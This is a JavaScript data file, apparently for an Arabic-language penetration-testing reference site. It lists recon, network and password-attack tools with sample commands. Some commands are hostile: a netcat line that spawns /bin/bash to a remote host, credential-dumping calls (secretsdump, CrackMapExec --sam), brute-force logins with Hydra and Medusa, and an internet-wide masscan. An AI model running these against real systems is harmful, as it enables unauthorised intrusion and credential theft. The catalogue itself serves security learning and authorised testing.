// بيانات الأدوات (22 أداة بالأوامر الأساسية)
export const toolSections = [
  { name: "أدوات اختبار اختراق الشبكات", description: "أدوات فحص و اختبار أمان الشبكات و المنافذ و الخدمات", path: "/tools/network-pentest", icon: "Radar", count: 8 },
  { name: "أدوات جمع المعلومات", description: "أدوات الاستطلاع و جمع المعلومات عن الأهداف .", path: "/tools/recon", icon: "Search", count: 8 },
  { name: "أدوات الـ Password Attacks", description: "أدوات كسر و تخمين كلمات المرور .", path: "/tools/password-attacks", icon: "Key", count: 6 },
]

export const toolsDetails = {
  "network-pentest": {
    title: "أدوات اختبار اختراق الشبكات",
    desc: "أدوات فحص و اختبار أمان الشبكات و المنافذ والخدمات .",
    subtitle: "أدوات أساسية لاختبار اختراق الشبكات .",
    tools: [
      { name: "Nmap", icon: "Radar", description: "أداة فحص المنافذ و الخدمات الأقوى و الأكثر استخداماً في العالم .", commands: ["nmap -sV <target>", "nmap -A <target>", "nmap -sC <target>", "nmap -p- <target>", "nmap --script vuln <target>"], website: "https://nmap.org/" },
      { name: "Masscan", icon: "Zap", description: "أسرع أداة لفحص المنافذ على نطاق واسع .", commands: ["masscan -p1-65535 <target> --rate=1000", "masscan -p80,443 0.0.0.0/0 --rate=10000"], website: "https://github.com/robertdavidgraham/masscan" },
      { name: "Netcat", icon: "Terminal", description: "سكين الجيش السويسري للشبكات - نقل البيانات و الاتصالات .", commands: ["nc -lvnp 4444", "nc <target> 80", "nc -e /bin/bash <target> 4444"], website: "https://nc110.sourceforge.io/" },
      { name: "Metasploit Framework", icon: "Bug", description: "أشهر إطار عمل لاختبار الاختراق و استغلال الثغرات .", commands: ["msfconsole", "use exploit/...", "set RHOSTS <target>", "exploit"], website: "https://www.metasploit.com/" },
      { name: "Responder", icon: "Network", description: "أداة لالتقاط كلمات المرور عبر بروتوكولات LLMNR , NBT-NS , MDNS .", commands: ["responder -I eth0", "responder -I eth0 -wrf"], website: "https://github.com/lgandx/Responder" },
      { name: "Impacket", icon: "Server", description: "مجموعة أدوات Python للتعامل مع بروتوكولات الشبكة .", commands: ["psexec.py user:pass@<target>", "secretsdump.py user:pass@<target>", "smbclient.py user:pass@<target>"], website: "https://github.com/SecureAuthCorp/impacket" },
      { name: "CrackMapExec", icon: "Shield", description: "أداة قوية لاختبار اختراق Active Directory و الشبكات .", commands: ["crackmapexec smb <target> -u user -p pass", "crackmapexec smb <target> --shares", "crackmapexec smb <target> --sam"], website: "https://github.com/byt3bl33d3r/CrackMapExec" },
      { name: "Enum4linux", icon: "Search", description: "أداة لجمع المعلومات من أنظمة Windows عبر SMB .", commands: ["enum4linux -a <target>", "enum4linux -U <target>", "enum4linux -S <target>"], website: "https://github.com/CiscoCXSecurity/enum4linux" },
    ],
  },
  recon: {
    title: "أدوات جمع المعلومات",
    desc: "أدوات الاستطلاع و جمع المعلومات عن الأهداف .",
    subtitle: "أدوات أساسية لجمع المعلومات و الاستطلاع .",
    tools: [
      { name: "Shodan", icon: "Search", description: "محرك بحث للأجهزة المتصلة بالإنترنت .", commands: ['shodan search "apache"', "shodan host 1.1.1.1", "port:22 country:SA", 'org:"company name"'], website: "https://www.shodan.io/" },
      { name: "Censys", icon: "Globe", description: "منصة بحث عن الأجهزة و الشهادات .", commands: ["services.port: 443", 'location.country: "Saudi Arabia"', 'services.software.product: "nginx"'], website: "https://censys.io/" },
      { name: "Amass", icon: "Radar", description: "أداة قوية لاكتشاف النطاقات الفرعية .", commands: ["amass enum -d target.com", "amass enum -passive -d target.com", "amass intel -whois -d target.com"], website: "https://github.com/owasp-amass/amass" },
      { name: "Subfinder", icon: "Server", description: "أداة سريعة لاكتشاف النطاقات الفرعية .", commands: ["subfinder -d target.com", "subfinder -d target.com -o output.txt", "subfinder -dL domains.txt"], website: "https://github.com/projectdiscovery/subfinder" },
      { name: "theHarvester", icon: "Database", description: "أداة لجمع البريد الإلكتروني و النطاقات .", commands: ["theHarvester -d target.com -b google", "theHarvester -d target.com -b all", "theHarvester -d target.com -l 500"], website: "https://github.com/laramies/theHarvester" },
      { name: "DNSRecon", icon: "FileSearch", description: "أداة لجمع معلومات DNS .", commands: ["dnsrecon -d target.com", "dnsrecon -d target.com -t axfr", "dnsrecon -d target.com -D wordlist.txt -t brt"], website: "https://github.com/darkoperator/dnsrecon" },
      { name: "Fierce", icon: "Terminal", description: "أداة لاكتشاف DNS و النطاقات .", commands: ["fierce --domain target.com", "fierce --domain target.com --subdomains"], website: "https://github.com/mschwager/fierce" },
      { name: "Recon-ng", icon: "Eye", description: "إطار عمل كامل للاستطلاع .", commands: ["recon-ng", "workspaces create target", "modules load recon/domains-hosts/hackertarget", "run"], website: "https://github.com/lanmaster53/recon-ng" },
    ],
  },
  "password-attacks": {
    title: "أدوات الـ Password Attacks",
    desc: "أدوات كسر و تخمين كلمات المرور .",
    subtitle: "أدوات أساسية لهجمات كلمات المرور .",
    tools: [
      { name: "Hydra", icon: "Zap", description: "أداة تخمين كلمات المرور عبر البروتوكولات المختلفة .", commands: ["hydra -l admin -P passwords.txt ssh://target", "hydra -L users.txt -P pass.txt ftp://target", 'hydra -l admin -P pass.txt http-post-form "..."', "hydra -l user -P pass.txt rdp://target"], website: "https://github.com/vanhauser-thc/thc-hydra" },
      { name: "John the Ripper", icon: "Key", description: "أداة كسر كلمات المرور الشهيرة .", commands: ["john --wordlist=rockyou.txt hashes.txt", "john --format=NT hashes.txt", "john --show hashes.txt", "unshadow passwd shadow > combined.txt"], website: "https://www.openwall.com/john/" },
      { name: "Hashcat", icon: "Hash", description: "أسرع أداة لكسر الـ Hashes باستخدام GPU .", commands: ["hashcat -m 0 hashes.txt wordlist.txt", "hashcat -m 1000 hashes.txt wordlist.txt", "hashcat -m 0 -a 3 hashes.txt ?a?a?a?a", "hashcat --show hashes.txt"], website: "https://hashcat.net/hashcat/" },
      { name: "Medusa", icon: "Terminal", description: "أداة تخمين كلمات المرور بالتوازي .", commands: ["medusa -h target -u admin -P pass.txt -M ssh", "medusa -H hosts.txt -U users.txt -P pass.txt -M ftp"], website: "http://foofus.net/goons/jmk/medusa/medusa.html" },
      { name: "CeWL", icon: "Database", description: "أداة إنشاء قوائم كلمات من المواقع .", commands: ["cewl -d 2 -m 5 https://target.com", "cewl -d 2 -m 5 -w wordlist.txt https://target.com", "cewl -e -a https://target.com"], website: "https://github.com/digininja/CeWL" },
      { name: "Crunch", icon: "Lock", description: "أداة إنشاء قوائم كلمات مخصصة .", commands: ["crunch 8 8 -o wordlist.txt", "crunch 6 8 abc123 -o wordlist.txt", "crunch 8 8 -t pass@@@@"], website: "https://github.com/jim3ma/crunch" },
    ],
  },
}
